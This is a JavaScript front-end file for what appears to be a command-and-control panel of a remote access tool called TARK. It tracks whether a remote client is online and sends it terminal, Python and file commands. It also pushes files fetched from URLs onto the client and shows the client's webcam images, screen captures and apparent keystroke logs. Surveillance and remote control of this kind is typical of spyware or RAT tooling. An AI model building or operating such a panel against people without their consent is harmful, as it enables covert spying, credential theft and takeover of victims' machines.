const componentBtns = document.querySelectorAll(`[data-component]`)
const componentForms = document.querySelectorAll(`.component-form`)
const componentOutputs = document.querySelectorAll(`.component-output`)
const sidebar = document.querySelector("aside")
const clientStatus = document.querySelector("#client-status")
const cwdText = document.querySelectorAll(".cwd-text")
const lastOnlineText = document.querySelector("#lastOnline-text")
const lastOfflineText = document.querySelector("#lastOffline-text")
const filemanagerUpload = document.querySelector("#filemanager-upload")
const filesTable = document.querySelector("#files-table")

const indexComponent = new URLSearchParams(window.location.search).get("component") || "terminal"
const socket = io("", {
    secure: true,
    transports: ["websocket"],
    auth: {
        id: window.__TARK_DATA__.id,
        clientType: "browser"
    }
})

// === Component Switcher ===
function switchComponent(btn, form, output) {
    componentBtns.forEach(b => b.classList.remove("has-background-grey-dark"))
    componentForms.forEach(f => f.classList.remove("active"))
    componentOutputs.forEach(o => o.classList.remove("active"))

    btn.classList.add("has-background-grey-dark")
    form.classList.add("active")
    output.classList.add("active")
}

function updateCwdText(cwd) {
    cwdText.forEach(element => {
        if (["INPUT", "TEXTAREA"].includes(element.tagName)) {
            element.value = cwd
        } else {
            element.innerText = cwd
        }
    })
}

async function sendCommand(data) {
    try {
        const response = await fetch(location.href, {
            method: "POST",
            body: JSON.stringify(data),
            headers: {
                "Content-Type": "application/json"
            }
        })

        const jsonData = await response.json()
        const outputContainer = document.querySelector(`.${data.type}-output`)
        if (!jsonData.ack) {
            addCommandOutput(outputContainer, jsonData.msg, jsonData.ack)
        }

        return jsonData.ack
    } catch (error) {
        return {
            ack: false,
            msg: error.message,
        }
    }
}

function addCommandOutput(container, message, ack) {
    const wrapper = document.createElement("div")
    wrapper.className = "my-2 is-flex is-gap-1 is-align-items-center"

    const msgCode = document.createElement("code")
    msgCode.className = `has-text-${ack ? "success" : "danger"}`
    msgCode.innerText = message

    const timeCode = document.createElement("code")
    timeCode.className = "has-text-info"
    timeCode.innerText = new Date().toLocaleString()

    wrapper.append(msgCode, timeCode)
    container.appendChild(wrapper)

    container.scrollTo({
        top: container.scrollHeight,
        behavior: "smooth"
    })
}

function addCommandLine(container, message) {
    const div = document.createElement("div")
    div.className = "line"
    div.innerText = message
    container.appendChild(div)
}

function renderFilesTable(rawData) {
    const allFiles = []
    const { files, folders } = JSON.parse(rawData)
    const tbody = document.createElement("tbody")

    allFiles.push({
        isFile: false,
        name: "..",
    })

    folders.forEach(folder => {
        allFiles.push({
            isFile: false,
            name: folder,
        })
    })

    files.forEach(file => {
        allFiles.push({
            isFile: true,
            name: file,
        })
    })

    allFiles.forEach(file => {
        const tr = document.createElement("tr")
        tr.innerHTML = `
            <td>
                <div class="is-flex is-gap-1 is-align-items-center is-clickable">
                    <span class="icon">
                        ${file.isFile
                ? `<span class="mdi mdi-file has-text-grey"></span>`
                : `<span class="mdi mdi-folder has-text-warning"></span>`
            }
                    </span>
                    <span>${file.name}</span>
                </div>
            </td>
        `

        const btn = tr.querySelector("td")
        btn.addEventListener("click", async () => {
            await sendCommand({
                type: "filemanager",
                action: "download",
                value: file.name,
            })
        })

        tbody.appendChild(tr)
    })

    filesTable.innerHTML = ""
    filesTable.appendChild(tbody)
}

componentBtns.forEach(element => {
    const componentName = element.dataset.component
    const form = document.querySelector(`.${componentName}-form`)
    const output = document.querySelector(`.${componentName}-output`)

    if (componentName === indexComponent) {
        switchComponent(element, form, output)
    }

    element.addEventListener("click", () => {
        switchComponent(element, form, output)

        if (window.innerWidth < 768) {
            sidebar.classList.remove("active")
        }
    })
})

document.querySelectorAll(".menu-button").forEach(element => {
    element.addEventListener("click", () => {
        sidebar.classList.toggle("active")
    })
})

componentForms.forEach(form => {
    form.addEventListener("submit", async (e) => {
        e.preventDefault()
        const formData = new FormData(form)
        const data = Object.fromEntries(formData.entries())
        const outputContainer = document.querySelector(`.${data.type}-output`)
        const message = Object.entries(data).map(([key, value]) => {
            if (
                ["type"].includes(key) ||
                ["python"].includes(data.type)
            ) return false
            return `[${value}]`
        }).filter(Boolean)

        addCommandOutput(outputContainer, message.join("::"), true)

        const state = await sendCommand(data)
        if (state) {
            form.querySelectorAll(`[clear]`).forEach(element => {
                element.value = ""
            })
        }
    })
})

filemanagerUpload.addEventListener("click", async () => {
    const url = prompt("filename@URL")
    if (!url) return

    await sendCommand({
        type: "filemanager",
        action: "upload",
        value: url,
    })
})

// === Socket Event Listeners ===
socket.on("connect", () => {
    console.log("Browser Connected")
})

socket.on("client-ping", data => {
    console.log("Client ping", data)
    if (data.id === window.__TARK_DATA__.id) {
        if (data.isOnline) {
            lastOnlineText.innerText = data.lastOnline
            clientStatus.classList.remove("has-text-danger")
            clientStatus.classList.add("has-text-primary")
        } else {
            lastOfflineText.innerText = data.lastOffline
            clientStatus.classList.remove("has-text-primary")
            clientStatus.classList.add("has-text-danger")
        }
    }
})

socket.on("receiver", data => {
    console.log("Received data:", data)
    if (!data.type) return
    const outputContainer = document.querySelector(`.${data.type}-output`)

    // if it has cwd
    if (data.cwd) {
        updateCwdText(data.cwd)
    }

    if (data.type === "terminal") {
        addCommandLine(outputContainer, data.output)
    }

    else if (data.type === "webcam") {
        if (data.url) {
            const img = document.createElement("img")
            img.src = data.url
            outputContainer.appendChild(img)
        } else {
            addCommandLine(outputContainer, data.output)
        }
    }

    else if (data.type === "display") {
        if (data.url) {
            const tag = data.url.endsWith(".mp4") ? "video" : "img"
            const element = document.createElement(tag)
            element.src = data.url
            outputContainer.appendChild(element)

            if (tag === "video") {
                element.controls = true
            }
        } else {
            addCommandLine(outputContainer, data.output)
        }
    }

    else if (data.type === "keyboard") {
        const code = document.createElement("code")
        code.className = "m-1 is-inline-block"
        code.innerText = data.output
        outputContainer.appendChild(code)
    }

    else if (data.type === "filemanager") {
        if (data.cwd) {
            renderFilesTable(data.output)
        } 

        else if (data.url) {
            const a = document.createElement("a")
            a.className = "is-block my-2"
            a.href = data.url
            a.target = "_blank"
            a.innerText = `Downloaded file: ${data.url}`
            outputContainer.appendChild(a)
        }
        
        else {
            addCommandLine(outputContainer, data.output)
        }
    }

    else {
        addCommandLine(outputContainer, data.output)
    }

    outputContainer.scrollTo({
        top: outputContainer.scrollHeight,
        behavior: "smooth"
    })
})